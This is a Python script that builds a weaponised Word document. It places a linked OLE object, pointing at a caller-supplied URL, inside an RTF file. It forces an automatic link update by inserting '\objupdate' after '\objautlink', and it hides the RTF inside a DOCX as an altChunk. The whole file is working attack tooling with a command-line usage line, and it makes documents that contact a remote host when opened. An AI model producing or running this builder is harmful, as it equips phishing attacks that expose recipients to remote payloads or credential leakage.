# pip install python-docx pywin32
import sys
import os
from docx import Document
from docx.oxml.parser import OxmlElement
from docx.oxml.ns import qn
from docx.opc.part import Part
from docx.opc.constants import RELATIONSHIP_TYPE as RT
import win32com.client as win32


# Get or create a DOCX document
def get_doc(docx_file_path):
    if not os.path.isfile(docx_file_path):
        doc = Document()
        doc.save(docx_file_path)
        print(f"[+] Created a new DOCX document with name '{docx_file_path}'.")
    else:
        doc = Document(docx_file_path)
        print(f"[+] Using an existing DOCX document with name '{docx_file_path}'.")
    return doc

# Check if the RTF file exists, and create it if it doesn't
def check_rtf_exists(rtf_file_path):
    if not os.path.isfile(rtf_file_path):
        gen_new_rtf(rtf_file_path)
        print(f"[+] Created a new RTF document with name '{rtf_file_path}'.")
    else:
        print(f"[+] Using an existing RTF document with name '{rtf_file_path}'.")

# Generate a new RTF file with default content
def gen_new_rtf(rtf_file_path):
    try:
        with open(rtf_file_path, 'w') as file:
            rtf_example_code = "{\\rtf1\\ansi\\deff0}"
            file.write(rtf_example_code)
    except Exception as e:
        print(f"[-] Cannot create the RTF file. Error: {str(e)}")
        sys.exit(1)

# Update the RTF file by adding '\objupdate' after '\objautolink'
def update_rtf_with_objupdate(file_path):
    try:
        with open(file_path, 'r') as file:
            # Read the content of the file
            file_content = file.read()

        # Replace "\objautolink" with "\objautolink\objupdate"
        updated_content = file_content.replace(r'\objautlink', r'\objautlink\objupdate')

        with open(file_path, 'w') as file:
            # Write the updated content back to the file
            file.write(updated_content)

        print(f"[+] '\objupdate' added after '\objautolink' in '{file_path}'.")

    except Exception as e:
        print(f"[-] An error occurred: {str(e)}")

# Add an RTF file as an altChunk to a DOCX document
def add_rtf_as_alt_chunk_to_doc(doc, rtf_path):
    try:
        package = doc.part.package
        partname = package.next_partname('/word/altChunk%d.rtf')

        # Read the RTF content from the file
        with open(rtf_path, 'rb') as rtf_file:
            rtf_content = rtf_file.read()

        alt_part = Part(partname, 'application/rtf', rtf_content, package)
        r_id = doc.part.relate_to(alt_part, RT.A_F_CHUNK)

        alt_chunk = OxmlElement('w:altChunk')
        alt_chunk.set(qn('r:id'), r_id)
        doc.element.body.sectPr.addprevious(alt_chunk)

        print("[+] RTF file added as altChunk.")

        # Save the modified document
        doc.save(docx_file_path)

        update_rtf_with_objupdate(rtf_path)

    except Exception as e:
        print(f"[-] Can not add the RTF file as altChunk to the DOC. Error: {str(e)}")
        sys.exit(1)

# Add a linked OLE object with a URL to the RTF file
def add_linked_ole_object_with_url(rtf_path, url):
    try:
        word = win32.Dispatch("Word.Application")
        doc = word.Documents.Open(os.path.abspath(rtf_path))
        doc.Activate()

        # Insert the linked OLE object with an external URL
        ole_shape = doc.Shapes.AddOLEObject(
            ClassType="Package",
            FileName=url,        # Use the URL as the FileName
            LinkToFile=True,     # Create a linked object
            DisplayAsIcon=True,
            Left=100, Top=100, Width=100, Height=100
        )

        # Save the document
        doc.Save()

        # Close the document and Word application
        doc.Close()
        word.Quit()

        print(f"[+] Linked OLE object with URL added to '{rtf_path}'.")

    except Exception as e:
        print(f"[-] Cannot add a linked OLE object to the RTF file. Error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python generate_rtf_with_autolink.py <doc_file> <rtf_file> <ole_objects_url>")
        sys.exit(1)

    # Get arguments
    docx_file_path = sys.argv[1]
    rtf_file_path = sys.argv[2]
    url = sys.argv[3]

    # Check if the DOCX file exists, if not, create one
    doc = get_doc(docx_file_path)

    # Check if the RTF file exists, if not, create one
    check_rtf_exists(rtf_file_path)

    # Add a linked OLE object to RTF with an external URL
    add_linked_ole_object_with_url(rtf_file_path, url)

    # Add the RTF file to the DOCX as an altChunk
    add_rtf_as_alt_chunk_to_doc(doc, rtf_file_path)

    print(f"[+] RTF file '{rtf_file_path}' added as altChunk to '{docx_file_path}'.")
